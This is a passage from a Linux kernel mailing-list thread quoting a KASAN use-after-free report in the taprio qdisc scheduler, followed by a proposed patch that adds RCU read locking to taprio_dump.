> >     R13: 000000000000000b R14: 00007f56f37cbf80 R15: 00007f56f43c5000
> >      </TASK>
> >
> >     Allocated by task 41957:
> >      kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
> >      kasan_set_track+0x25/0x30 mm/kasan/common.c:52
> >      ____kasan_kmalloc mm/kasan/common.c:374 [inline]
> >      __kasan_kmalloc+0xa2/0xb0 mm/kasan/common.c:383
> >      kmalloc include/linux/slab.h:600 [inline]
> >      kzalloc include/linux/slab.h:721 [inline]
> >      taprio_change+0x60c/0x2870 net/sched/sch_taprio.c:1881
> >      taprio_init+0x6b5/0x940 net/sched/sch_taprio.c:2134
> >      qdisc_create+0x4d1/0x10b0 net/sched/sch_api.c:1326
> >      tc_modify_qdisc+0x48e/0x1860 net/sched/sch_api.c:1747
> >      rtnetlink_rcv_msg+0x3cb/0xf10 net/core/rtnetlink.c:6558
> >      netlink_rcv_skb+0x165/0x420 net/netlink/af_netlink.c:2545
> >      netlink_unicast_kernel net/netlink/af_netlink.c:1342 [inline]
> >      netlink_unicast+0x54d/0x810 net/netlink/af_netlink.c:1368
> >      netlink_sendmsg+0x92f/0xe50 net/netlink/af_netlink.c:1910
> >      sock_sendmsg_nosec net/socket.c:730 [inline]
> >      __sock_sendmsg+0xda/0x180 net/socket.c:745
> >      ____sys_sendmsg+0x70f/0x870 net/socket.c:2584
> >      ___sys_sendmsg+0x11d/0x1b0 net/socket.c:2638
> >      __sys_sendmsg+0xfe/0x1d0 net/socket.c:2667
> >      do_syscall_x64 arch/x86/entry/common.c:51 [inline]
> >      do_syscall_64+0x3f/0xe0 arch/x86/entry/common.c:82
> >      entry_SYSCALL_64_after_hwframe+0x63/0x6b
> >
> >     Freed by task 2250:
> >      kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
> >      kasan_set_track+0x25/0x30 mm/kasan/common.c:52
> >      kasan_save_free_info+0x2b/0x40 mm/kasan/generic.c:522
> >      ____kasan_slab_free+0x15e/0x1c0 mm/kasan/common.c:236
> >      kasan_slab_free include/linux/kasan.h:164 [inline]
> >      slab_free_hook mm/slub.c:1800 [inline]
> >      slab_free_freelist_hook+0x95/0x1d0 mm/slub.c:1826
> >      slab_free mm/slub.c:3809 [inline]
> >      __kmem_cache_free+0xc0/0x180 mm/slub.c:3822
> >      rcu_do_batch+0x38c/0xd20 kernel/rcu/tree.c:2158
> >      rcu_core+0x273/0x4b0 kernel/rcu/tree.c:2431
> >      __do_softirq+0x1d4/0x850 kernel/softirq.c:553
> >
> >     Last potentially related work creation:
> >      kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
> >      __kasan_record_aux_stack+0xbc/0xd0 mm/kasan/generic.c:492
> >      __call_rcu_common.constprop.0+0x99/0x790 kernel/rcu/tree.c:2681
> >      switch_schedules net/sched/sch_taprio.c:210 [inline]
> >      advance_sched+0x5d3/0xce0 net/sched/sch_taprio.c:984
> >      __run_hrtimer kernel/time/hrtimer.c:1688 [inline]
> >      __hrtimer_run_queues+0x604/0xc00 kernel/time/hrtimer.c:1752
> >      hrtimer_interrupt+0x320/0x7b0 kernel/time/hrtimer.c:1814
> >      local_apic_timer_interrupt arch/x86/kernel/apic/apic.c:1065 [inlin=
e]
> >      __sysvec_apic_timer_interrupt+0x105/0x3f0 arch/x86/kernel/apic/api=
c.c:1082
> >      sysvec_apic_timer_interrupt+0x92/0xc0 arch/x86/kernel/apic/apic.c:=
1076
> >      asm_sysvec_apic_timer_interrupt+0x1a/0x20 arch/x86/include/asm/idt=
entry.h:645
> >
> >     Second to last potentially related work creation:
> >      kasan_save_stack+0x22/0x40 mm/kasan/common.c:45
> >      __kasan_record_aux_stack+0xbc/0xd0 mm/kasan/generic.c:492
> >      kvfree_call_rcu+0xfe/0x480 kernel/rcu/tree.c:3400
> >      drop_sysctl_table+0x2f1/0x3b0 fs/proc/proc_sysctl.c:1508
> >      unregister_sysctl_table+0x41/0x60 fs/proc/proc_sysctl.c:1529
> >      neigh_sysctl_unregister+0x5f/0x80 net/core/neighbour.c:3873
> >      addrconf_ifdown.isra.0+0x13af/0x1970 net/ipv6/addrconf.c:3957
> >      addrconf_notify+0x105/0x1210 net/ipv6/addrconf.c:3727
> >      notifier_call_chain+0xba/0x3d0 kernel/notifier.c:93
> >      call_netdevice_notifiers_info+0xbe/0x130 net/core/dev.c:1967
> >      call_netdevice_notifiers_extack net/core/dev.c:2005 [inline]
> >      call_netdevice_notifiers net/core/dev.c:2019 [inline]
> >      unregister_netdevice_many_notify+0x6e2/0x1460 net/core/dev.c:11040
> >      vti6_exit_batch_net+0x37d/0x3f0 net/ipv6/ip6_vti.c:1188
> >      ops_exit_list+0x125/0x170 net/core/net_namespace.c:175
> >      cleanup_net+0x4ee/0x9d0 net/core/net_namespace.c:614
> >      process_one_work+0x830/0x1540 kernel/workqueue.c:2630
> >      process_scheduled_works kernel/workqueue.c:2703 [inline]
> >      worker_thread+0x855/0x11f0 kernel/workqueue.c:2784
> >      kthread+0x346/0x450 kernel/kthread.c:388
> >      ret_from_fork+0x45/0x80 arch/x86/kernel/process.c:147
> >      ret_from_fork_asm+0x11/0x20 arch/x86/entry/entry_64.S:242
> >
> >     The buggy address belongs to the object at ffff88805d203c00
> >      which belongs to the cache kmalloc-512 of size 512
> >     The buggy address is located 192 bytes inside of
> >      freed 512-byte region [ffff88805d203c00, ffff88805d203e00)
> >
> >     The buggy address belongs to the physical page:
> >     page:ffffea0001748000 refcount:1 mapcount:0 mapping:000000000000000=
0 index:0x0 pfn:0x5d200
> >     head:ffffea0001748000 order:2 entire_mapcount:0 nr_pages_mapped:0 p=
incount:0
> >     flags: 0xfff00000000840(slab|head|node=3D0|zone=3D1|lastcpupid=3D0x=
7ff)
> >     page_type: 0xffffffff()
> >     raw: 00fff00000000840 ffff88800cc41c80 dead000000000100 dead0000000=
00122
> >     raw: 0000000000000000 0000000000100010 00000001ffffffff 00000000000=
00000
> >     page dumped because: kasan: bad access detected
> >     page_owner tracks the page as allocated
> >     page last allocated via order 2, migratetype Unmovable, gfp_mask 0x=
1d2040(__GFP_IO|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC|__GF=
P_HARDWALL), pid 10126, tgid 10126 (kworker/u5:5), ts 66769655423, free_ts =
66738009716
> >      set_page_owner include/linux/page_owner.h:31 [inline]
> >      post_alloc_hook+0x2d8/0x350 mm/page_alloc.c:1537
> >      prep_new_page mm/page_alloc.c:1544 [inline]
> >      get_page_from_freelist+0x8a8/0xeb0 mm/page_alloc.c:3312
> >      __alloc_pages+0x1cb/0x4a0 mm/page_alloc.c:4568
> >      alloc_pages_mpol+0x245/0x5e0 mm/mempolicy.c:2133
> >      alloc_slab_page mm/slub.c:1870 [inline]
> >      allocate_slab+0x261/0x390 mm/slub.c:2017
> >      ___slab_alloc+0x967/0x11b0 mm/slub.c:3223
> >      __slab_alloc.constprop.0+0x56/0xa0 mm/slub.c:3322
> >      __slab_alloc_node mm/slub.c:3375 [inline]
> >      slab_alloc_node mm/slub.c:3468 [inline]
> >      __kmem_cache_alloc_node+0x2c6/0x340 mm/slub.c:3517
> >      kmalloc_trace+0x26/0xe0 mm/slab_common.c:1098
> >      kmalloc include/linux/slab.h:600 [inline]
> >      kzalloc include/linux/slab.h:721 [inline]
> >      tomoyo_find_next_domain+0xd5/0x1630 security/tomoyo/domain.c:710
> >      tomoyo_bprm_check_security+0x137/0x1c0 security/tomoyo/tomoyo.c:10=
1
> >      security_bprm_check+0x49/0xb0 security/security.c:1103
> >      search_binary_handler+0xde/0x6e0 fs/exec.c:1725
> >      exec_binprm+0x146/0x770 fs/exec.c:1779
> >      bprm_execve+0x1f2/0x6a0 fs/exec.c:1854
> >      kernel_execve+0x3ba/0x4b0 fs/exec.c:2022
> >     page last free stack trace:
> >      reset_page_owner include/linux/page_owner.h:24 [inline]
> >      free_pages_prepare mm/page_alloc.c:1137 [inline]
> >      free_unref_page_prepare+0x4c6/0xb20 mm/page_alloc.c:2347
> >      free_unref_page+0x33/0x3d0 mm/page_alloc.c:2487
> >      __unfreeze_partials+0x1fb/0x210 mm/slub.c:2655
> >      qlink_free mm/kasan/quarantine.c:168 [inline]
> >      qlist_free_all+0x6a/0x170 mm/kasan/quarantine.c:187
> >      kasan_quarantine_reduce+0x18e/0x1d0 mm/kasan/quarantine.c:294
> >      __kasan_slab_alloc+0x63/0x90 mm/kasan/common.c:305
> >      kasan_slab_alloc include/linux/kasan.h:188 [inline]
> >      slab_post_alloc_hook mm/slab.h:763 [inline]
> >      slab_alloc_node mm/slub.c:3478 [inline]
> >      slab_alloc mm/slub.c:3486 [inline]
> >      __kmem_cache_alloc_lru mm/slub.c:3493 [inline]
> >      kmem_cache_alloc+0x163/0x390 mm/slub.c:3502
> >      getname_flags+0xd6/0x5c0 fs/namei.c:140
> >      do_sys_openat2+0xe8/0x1c0 fs/open.c:1434
> >      do_sys_open fs/open.c:1455 [inline]
> >      __do_sys_openat fs/open.c:1471 [inline]
> >      __se_sys_openat fs/open.c:1466 [inline]
> >      __x64_sys_openat+0x140/0x1f0 fs/open.c:1466
> >      do_syscall_x64 arch/x86/entry/common.c:51 [inline]
> >      do_syscall_64+0x3f/0xe0 arch/x86/entry/common.c:82
> >      entry_SYSCALL_64_after_hwframe+0x63/0x6b
> >
> >     Memory state around the buggy address:
> >      ffff88805d203b80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
> >      ffff88805d203c00: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
> >     >ffff88805d203c80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
> >                                                ^
> >      ffff88805d203d00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
> >      ffff88805d203d80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
> >     =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> >
> > patch:
> >
> > Signed-off-by: Team p0pk3rn <bob.p0pk3rn@gmail.com>
> > Reported-by: Team p0pk3rn <bob.p0pk3rn@gmail.com>
> > Fixes: 18cdd2f0998a ("net/sched: taprio: taprio_dump and taprio_change =
are protected by rtnl_mutex")
> > ---
> >  net/sched/sch_taprio.c | 7 +++++--
> >  1 file changed, 5 insertions(+), 2 deletions(-)
> >
> > diff --git a/net/sched/sch_taprio.c b/net/sched/sch_taprio.c
> > index 31a8252bd09c..0b7b3e462f1a 100644
> > --- a/net/sched/sch_taprio.c
> > +++ b/net/sched/sch_taprio.c
> > @@ -2394,8 +2394,9 @@ static int taprio_dump(struct Qdisc *sch, struct =
sk_buff *skb)
> >       struct tc_mqprio_qopt opt =3D { 0 };
> >       struct nlattr *nest, *sched_nest;
> >
> > -     oper =3D rtnl_dereference(q->oper_sched);
> > -     admin =3D rtnl_dereference(q->admin_sched);
> > +     rcu_read_lock();
> > +     oper =3D rcu_dereference(q->oper_sched);
> > +     admin =3D rcu_dereference(q->admin_sched);
> >
> >       mqprio_qopt_reconstruct(dev, &opt);
> >
> > @@ -2436,6 +2437,7 @@ static int taprio_dump(struct Qdisc *sch, struct =
sk_buff *skb)
> >       nla_nest_end(skb, sched_nest);
> >
> >  done:
> > +     rcu_read_unlock();
> >       return nla_nest_end(skb, nest);
> >
> >  admin_error:
> > @@ -2445,6 +2447,7 @@ static int taprio_dump(struct Qdisc *sch, struct =
sk_buff *skb)
> >       nla_nest_cancel(skb, nest);
> >
> >  start_error:
> > +     rcu_read_unlock();
> >       return -ENOSPC;
> >  }
> >
> > --
> > 2.34.1
> >
>
> --
> Vinicius

